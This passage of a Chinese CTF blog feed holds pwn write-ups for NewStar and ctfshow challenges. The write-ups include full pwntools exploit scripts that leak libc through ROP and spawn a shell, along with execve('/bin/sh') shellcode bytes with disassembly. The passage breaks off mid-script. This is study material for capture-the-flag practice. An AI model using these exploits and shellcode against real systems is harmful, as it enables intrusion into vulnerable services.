title="文件描述符(fd)"></a>文件描述符(fd)</h4><p>用于标记和引用文件</p><p>标准输入（stdin）：<code>0</code></p><p>标准输出（stdout）：<code>1</code></p><p>标准错误（stderr）：<code>2</code></p><p>当使用 <code>fork()</code> 或 <code>dup()</code> 时，多个进程可以共享文件描述符，它们会指向相同的文件表项</p><h2 id="大佬wp"><a href="#大佬wp" class="headerlink" title="大佬wp"></a>大佬wp</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> struct<br>elf=ELF(<span class="hljs-string">&#x27;./one&#x27;</span>)<br>p=remote(<span class="hljs-string">&#x27;192.168.65.1&#x27;</span>,<span class="hljs-number">6666</span>)<br><span class="hljs-comment">#p = process(&#x27;./one&#x27;) </span><br>libc=ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">s</span>(<span class="hljs-params">a</span>):<br>    p.send(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sa</span>(<span class="hljs-params">a, b</span>):<br>    p.sendafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sl</span>(<span class="hljs-params">a</span>):<br>    p.sendline(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sla</span>(<span class="hljs-params">a, b</span>):<br>    p.sendlineafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">r</span>():<br>    p.recv()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pr</span>():<br>    <span class="hljs-built_in">print</span>(p.recv())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">li</span>(<span class="hljs-params">a</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(a))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rl</span>(<span class="hljs-params">a</span>):<br>    <span class="hljs-keyword">return</span> p.recvuntil(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inter</span>():<br>    p.interactive()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_32</span>():<br>    <span class="hljs-keyword">return</span> u32(p.recvuntil(<span class="hljs-string">b&#x27;\xf7&#x27;</span>)[-<span class="hljs-number">4</span>:])<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_addr</span>():<br>    <span class="hljs-keyword">return</span> u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_sb</span>():<br>    <span class="hljs-keyword">return</span> libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>], libc_base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">bug</span>():<br>    gdb.attach(p)<br>    pause()<br><br>magic=<span class="hljs-number">0x00000000004011dc</span><br><span class="hljs-comment">#bug()</span><br>rl(<span class="hljs-string">b&#x27;Show me your UN-Lucky number : &#x27;</span>)<br>s(p64(elf.got[<span class="hljs-string">&#x27;close&#x27;</span>]))<br>rl(<span class="hljs-string">b&#x27;Try to hack your UN-Lucky number with one byte :&#x27;</span>)<br>s(<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>s(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0x404200</span>)+p64(<span class="hljs-number">0x4013D2</span>))<br>rl(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>         rl(<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>libc_base=get_addr()<br>libc_base=get_addr()<br>libc_base=get_addr()<br>libc_base=get_addr()<br>libc_base=get_addr()<br>libc_base=get_addr()<br>libc_base=get_addr()<br>libc_base=get_addr()-<span class="hljs-number">0x2a28b</span><br>li(libc_base)<br>system,<span class="hljs-built_in">bin</span>=get_sb()<br>rdi=libc_base+<span class="hljs-number">0x000000000010f75b</span><br>rsi=libc_base+<span class="hljs-number">0x0000000000110a4d</span><br>syscall=libc_base+<span class="hljs-number">0x0000000000098fa6</span><br>rax=libc_base+<span class="hljs-number">0x00000000000dd237</span><br>open_addr=libc_base+libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>]<br>read_addr=libc_base + libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>write_addr=libc_base + libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br><br>s(p64(elf.got[<span class="hljs-string">&#x27;close&#x27;</span>]))<br>rl(<span class="hljs-string">b&#x27;Try to hack your UN-Lucky number with one byte :&#x27;</span>)<br>s(<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>s(<span class="hljs-string">b&#x27;/flag\x00\x00\x00&#x27;</span>+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(rdi)+p64(<span class="hljs-number">0x4041f0</span>)+p64(rsi)+p64(<span class="hljs-number">0</span>)+p64(open_addr)+p64(rdi)+p64(<span class="hljs-number">0x404008</span>)+p64(rsi)+p64(<span class="hljs-number">0x404080</span>+<span class="hljs-number">5</span>)+p64(libc_base+<span class="hljs-number">0x00000000000bf450</span>)+p64(rdi)+p64(<span class="hljs-number">3</span>)+p64(rsi)+p64(<span class="hljs-number">0x404200</span>)+p64(read_addr)+p64(rdi)+p64(<span class="hljs-number">1</span>)+p64(rsi)+p64(<span class="hljs-number">0x404200</span>)+p64(write_addr))<br>inter()<br></code></pre></td></tr></table></figure><blockquote><p>下面是自己学习时写的</p></blockquote><p>close_got修改为<code>_init_proc</code>,test rax,rax，逻辑与测试rax是否为0，为0则ZF置为1，不为0则call rax;<code>__gmon_start__</code>，返回到write函数</p><p><img src="https://sh1j1.github.io/img/NewStar/One_Last_B1te.assets/%7BCD7FFF9C-98E7-420B-B183-725A6CDB260C%7D.png" alt="{CD7FFF9C-98E7-420B-B183-725A6CDB260C}"></p><p><img src="https://sh1j1.github.io/img/NewStar/One_Last_B1te.assets/%7B737A0D89-1246-4C06-8DB3-FA53CF38B46A%7D.png" alt="{737A0D89-1246-4C06-8DB3-FA53CF38B46A}"></p><p><img src="https://sh1j1.github.io/img/NewStar/One_Last_B1te.assets/%7BCC26C01E-1DF3-4720-8525-3CF30A365CCE%7D.png" alt="{CC26C01E-1DF3-4720-8525-3CF30A365CCE}"></p><p><code>/flag --&gt; /x2f/x66/x6c/x61/x67</code></p><p><img src="https://sh1j1.github.io/img/NewStar/One_Last_B1te.assets/%7BF84BABBE-FD35-4328-BBDB-61FDA5BB37BE%7D.png" alt="{F84BABBE-FD35-4328-BBDB-61FDA5BB37BE}"></p><p><img src="https://sh1j1.github.io/img/NewStar/One_Last_B1te.assets/%7BE7E47A9B-516C-4B78-A9FA-4CFFF75E0E2B%7D.png" alt="{E7E47A9B-516C-4B78-A9FA-4CFFF75E0E2B}"></p><p>太妙了，将rsi内存地址的值传入rdx，向rdi内存地址传入rdx，同时给rdx赋值</p><p>这里将stderr指向标准错误的值赋值给rdx</p><p>妄寻鱼师傅tql</p>]]></content>
    
    
    <categories>
      
      <category>NewStar</category>
      
    </categories>
    
    
    <tags>
      
      <tag>每天一题的比赛复盘</tag>
      
      <tag>orw</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ctfshow_pwn62-63</title>
    <link href="/2024/11/27/ctfshow-pwn62-63/"/>
    <url>/2024/11/27/ctfshow-pwn62-63/</url>
    
    <content type="html"><![CDATA[<h1 id="pwn62pwn63-跳转执行"><a href="#pwn62pwn63-跳转执行" class="headerlink" title="pwn62pwn63_跳转执行"></a>pwn62pwn63_跳转执行</h1><p>限制长度为0x38h</p><p><strong>64位</strong></p><p><img src="https://sh1j1.github.io/img/ctfshow/%E6%A0%88%E6%BA%A2%E5%87%BA/%7B1B3FB4DF-50AF-4CC7-8109-E8ACB320CECA%7D.png" alt="{1B3FB4DF-50AF-4CC7-8109-E8ACB320CECA}"></p><p><strong>设计payload</strong></p><p>设计payload，中间使用jump跳过原来的返回地址，从而拆分shellcode</p><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs asm">mov rax,shell2<br>jmp rax<br>shell1<br></code></pre></td></tr></table></figure><p>使用以上方法间断执行shellcode</p></blockquote><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><span class="hljs-comment">#io = process(&#x27;./pwn61&#x27;)</span><br>io = remote(<span class="hljs-string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="hljs-number">28225</span>)<br><span class="hljs-comment">#shellcode = asm(shellcraft.sh())</span><br>shellcode = asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">        push 0x68</span><br><span class="hljs-string">        mov rbx,0x732f2f2f6e69622f</span><br><span class="hljs-string">        push rbx</span><br><span class="hljs-string">        mov rdi,rsp</span><br><span class="hljs-string">        xor rsi,rsi</span><br><span class="hljs-string">        xor rdx,rdx</span><br><span class="hljs-string">        xor rax,rax</span><br><span class="hljs-string">        mov al,59</span><br><span class="hljs-string">        syscall</span><br><span class="hljs-string">        &#x27;&#x27;&#x27;</span>)<br>shellcode1 = <span class="hljs-string">b&#x27;\x6A\x68\x48\xBB\x2F\x62\x69\x6E\x2F\x2F\x2F\x73&#x27;</span><br>jmp_1 = <span class="hljs-string">b&#x27;\x48\xb8&#x27;</span><br>jmp_2 = <span class="hljs-string">b&#x27;\xff\xe0&#x27;</span><br>shellcode2 = <span class="hljs-string">b&#x27;\x53\x48\x89\xE7\x48\x31\xF6\x48\x31\xD2\x48\x31\xC0\xB0\x3B\x0F\x05&#x27;</span><br>io.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>shell_addr = <span class="hljs-built_in">int</span>(io.recv(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>)<span class="hljs-comment">#6字节12个字符</span><br>shell_addr2 = shell_addr+<span class="hljs-number">0x20</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(shell_addr))<br>payload = shellcode1+jmp_1<br>payload += p64(shell_addr2)+jmp_2+p64(shell_addr)<br>payload += shellcode2<br>io.sendline(payload)<br>io.sendline(<span class="hljs-string">&#x27;cat ctfshow_flag&#x27;</span>)<br>io.interactive()<br></code></pre></td></tr></table></figure><p><img src="https://sh1j1.github.io/img/ctfshow/%E6%A0%88%E6%BA%A2%E5%87%BA/%7B93ACBB35-89C9-46A5-A521-CB9EA1BAE37E%7D.png" alt="{93ACBB35-89C9-46A5-A521-CB9EA1BAE37E}"></p><p><strong>长度32h</strong></p><p>pwn63，限制长度为0x37</p><p>拿下两题</p><h2 id="分析其他shellcode"><a href="#分析其他shellcode" class="headerlink" title="分析其他shellcode"></a>分析其他shellcode</h2><p><strong>24字节</strong>shellcode出处</p><p><a href="https://blog.csdn.net/akdelt/article/details/135954144?app_version=6.3.6&code=app_1562916241&csdn_share_tail=%7B%22type%22:%22blog%22,%22rType%22:%22article%22,%22rId%22:%22135954144%22,%22source%22:%22suibianshiba%22%7D&uLinkId=usr1mkqgl919blen&utm_source=app">CTFshow-pwn入门-栈溢出 (慢慢更_慢慢更ctfshowpwn-CSDN博客</a></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs py">padding = <span class="hljs-number">0x10</span>+<span class="hljs-number">8</span><br>shell_code = <span class="hljs-string">b&#x27;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05&#x27;</span><br>io.recvuntil(<span class="hljs-string">&quot;What&#x27;s this : [&quot;</span>)<br>v5_addr = <span class="hljs-built_in">eval</span>(io.recvuntil(<span class="hljs-string">&quot;]&quot;</span>,drop=<span class="hljs-literal">True</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(v5_addr))<br>payload = flat([cyclic(padding),v5_addr+padding+<span class="hljs-number">8</span>,shell_code])<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs asm">0x00:  48 31 F6                         xor     rsi, rsi<br>0x03:  56                               push    rsi<br>0x04:  48 BF 2F 62 69 6E 2F 2F 73 68    movabs  rdi, 0x68732f2f6e69622f<br>0x0e:  57                               push    rdi<br>0x0f:  54                               push    rsp<br>0x10:  5F                               pop     rdi<br>0x11:  B0 3B                            mov     al, 0x3b<br>0x13:  99                               cdq     <br>0x14:  0F 05                            syscall <br></code></pre></td></tr></table></figure><p>其他shell_code</p><p><strong>24字节和26字节</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs asm">\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\×2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05<br>0x00:  6A 3B                            push    0x3b<br>0x02:  58                               pop     rax<br>0x03:  99                               cdq     <br>0x04:  52                               push    rdx<br>0x05:  48 BB 2F 2F 62 69 6E 2F 73 68    movabs  rbx, 0x68732f6e69622f2f<br>0x0f:  53                               push    rbx<br>0x10:  54                               push    rsp<br>0x11:  5F                               pop     rdi<br>0x12:  52                               push    rdx<br>0x13:  57                               push    rdi<br>0x14:  54                               push    rsp<br>0x15:  5E                               pop     rsi<br>0x16:  0F 05                            syscall <br><br>\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05<br>0x00:  31 C0                            xor     eax, eax<br>0x02:  48 BB D1 9D 96 91 D0 8C 97 FF    movabs  rbx, 0xff978cd091969dd1<br>0x0c:  48 F7 DB                         neg     rbx<br>0x0f:  53                               push    rbx<br>0x10:  54                               push    rsp<br>0x11:  5F                               pop     rdi<br>0x12:  99                               cdq     <br>0x13:  52                               push    rdx<br>0x14:  57                               push    rdi<br>0x15:  54                               push    rsp<br>0x16:  5E                               pop     rsi<br>0x17:  B0 3B                            mov     al, 0x3b<br>0x19:  0F 05                            syscall <br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctfshow</category>
      
    </categories>
    
    
    <tags>
      
      <tag>栈溢出</tag>
      
      <tag>shellcode学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Week2_My_GBC</title>
    <link href="/2024/11/25/Week2-My-GBC/"/>
    <url>/2024/11/25/Week2-My-GBC/</url>
    
    <content type="html"><![CDATA[<h1 id="Week2-My-GBC"><a href="#Week2-My-GBC" class="headerlink" title="Week2_My_GBC"></a>Week2_My_GBC</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p><strong>安全策略</strong></p><p><img src="https://sh1j1.github.io/img/NewStar/My_GBC.assets/%257B97A28E25-D13A-4B97-B058-65A66DAB1097%257D.png" alt="{97A28E25-D13A-4B97-B058-65A66DAB1097}"></p><p><strong>逆向分析</strong></p><p>写入buf，输入buf，通过key对buf内容加密，输出加密后的buf，return 0，写入payload会被加密干扰</p><p><img src="https://sh1j1.github.io/img/NewStar/My_GBC.assets/%257BB2ED54E2-4FEF-463C-98A2-31F4BD9A3288%257D.png" alt="{B2ED54E2-4FEF-463C-98A2-31F4BD9A3288}"></p><p><img src="https://sh1j1.github.io/img/NewStar/My_GBC.assets/%257BC7AC980A-BB3A-4A98-9589-6EA552A214FF%257D.png" alt="{C7AC980A-BB3A-4A98-9589-6EA552A214FF}"></p><ul><li>对buf的内容的每位字节依次异或a2，然后循环左移3位<ul><li><code>_BYTE</code>：一种类型定义（通常为 <code>unsigned char</code> 或 <code>char</code>），表示该操作是针对 1 字节数据</li><li>逻辑(无符号数)左移：SHL,右移：SHR</li><li>算术(有符号数)左移：SAL,右移：SAR</li><li>循环左移：ROL,右移：ROR</li></ul></li></ul><p><img src="https://sh1j1.github.io/img/NewStar/My_GBC.assets/%257BE5B7813A-BB2F-4165-971E-119465E59C67%257D.png" alt="{E5B7813A-BB2F-4165-971E-119465E59C67}"></p><ul><li>只需要payload循环右移3位然后依次异或a2，即可保持原payload执行</li></ul><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><blockquote><p>注不是所有的C3都可以作为ret，只有位于代码段(通常位于.text段里面),这就是不能用的</p><p><img src="https://sh1j1.github.io/img/NewStar/My_GBC.assets/Snipaste_2024-11-25_19-06-47.png" alt="Snipaste_2024-11-25_19-06-47"></p></blockquote><p>利用csu的泄露libc地址</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,arch = <span class="hljs-string">&#x27;amd64&#x27;</span>)<br>flag = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> flag:<br>    p = remote(<span class="hljs-string">&#x27;192.168.65.1&#x27;</span>, <span class="hljs-number">6666</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&quot;./My_GBC&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sa</span>(<span class="hljs-params">s, n</span>): <span class="hljs-keyword">return</span> p.sendafter(s, n)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sla</span>(<span class="hljs-params">s, n</span>): <span class="hljs-keyword">return</span> p.sendlineafter(s, n)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sl</span>(<span class="hljs-params">s</span>): <span class="hljs-keyword">return</span> p.sendline(s)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sd</span>(<span class="hljs-params">s</span>): <span class="hljs-keyword">return</span> p.send(s)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc</span>(<span class="hljs-params">n</span>): <span class="hljs-keyword">return</span> p.recv(n)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ru</span>(<span class="hljs-params">s</span>): <span class="hljs-keyword">return</span> p.recvuntil(s)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ti</span>(): <span class="hljs-keyword">return</span> p.interactive()<br>key = <span class="hljs-number">0x5a</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">payload</span>):<br>    p2 = <span class="hljs-string">b&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> v <span class="hljs-keyword">in</span> payload:<br>        v2 = (v&gt;&gt;<span class="hljs-number">3</span>|v&lt;&lt;<span class="hljs-number">5</span>)&amp;<span class="hljs-number">0xff</span><br>        p2 += <span class="hljs-built_in">bytes</span>([v2^key])<br>    <span class="hljs-keyword">return</span> p2<br><br>elf = ELF(<span class="hljs-string">&#x27;./My_GBC&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br>write_got = elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br>read_got = elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]<br>main = <span class="hljs-number">0x40124C</span><br>rdi_ret = <span class="hljs-number">0x4013B3</span><br>csu_1 = <span class="hljs-number">0x4013AA</span><br>csu_2 = <span class="hljs-number">0x401390</span><br>ret = <span class="hljs-number">0x40139F</span><br><br>payload = flat([<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>,csu_1,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,read_got,<span class="hljs-number">8</span>,write_got,csu_2])+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">7</span>+p64(main)<br>sa(<span class="hljs-string">b&quot;something:&quot;</span>,decrypt(payload))<br>libc_base = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><span class="hljs-comment">#binsh = libc_base + next(libc.search(&quot;/bin/sh\x00&quot;))</span><br>binsh = libc_base + libc.search(<span class="hljs-string">b&quot;/bin/sh\x00&quot;</span>).__next__()<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x18</span>)+p64(ret)+p64(rdi_ret)+p64(binsh)+p64(system)<br>sa(<span class="hljs-string">b&quot;something:&quot;</span>,decrypt(payload))<br>ti()<br></code></pre></td></tr></table></figure><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><h2 id="官方wp"><a href="#官方wp" class="headerlink" title="官方wp"></a>官方wp</h2><p>看完wp1后，才看懂官方，感觉官方的比较复杂</p><ul><li><p>第一步使用csu泄露read地址</p></li><li><p>第二步使用csu,将payload1写入内存地址</p></li><li><p>第三步使用csu,对齐栈，为了执行payload1中的syscall先</p><ul><li>使用payload1的一个栈帧跳过call的返回地址</li></ul></li><li><p>第四步使用csu执行内存地址的<code>execve(&#39;/bin/sh\x00&#39;,0,0)</code></p></li></ul><p><a href="https://ns.openctf.net/wp/2024/week2/pwn/my-gbc.html">My_GBC!!!!! | WriteUp - NewStar CTF 2024</a></p><p>构造 ROP 链利用 CSU 初始化序列</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#基础配置</span><br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br>context.terminal = [<span class="hljs-string">&quot;tmux&quot;</span>, <span class="hljs-string">&quot;splitw&quot;</span>, <span class="hljs-string">&quot;-h&quot;</span>]<br><br><span class="hljs-comment">#pwntools的API封装</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">uu64</span>(<span class="hljs-params">x</span>): <span class="hljs-keyword">return</span> u64(x.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">s</span>(<span class="hljs-params">x</span>): <span class="hljs-keyword">return</span> p.send(x)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sa</span>(<span class="hljs-params">x, y</span>): <span class="hljs-keyword">return</span> p.sendafter(x, y)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sl</span>(<span class="hljs-params">x</span>): <span class="hljs-keyword">return</span> p.sendline(x)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sla</span>(<span class="hljs-params">x, y</span>): <span class="hljs-keyword">return</span> p.sendlineafter(x, y)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">r</span>(<span class="hljs-params">x</span>): <span class="hljs-keyword">return</span> p.recv(x)<br><span class="hljs-keyword">def</span> <span class="hljs-title 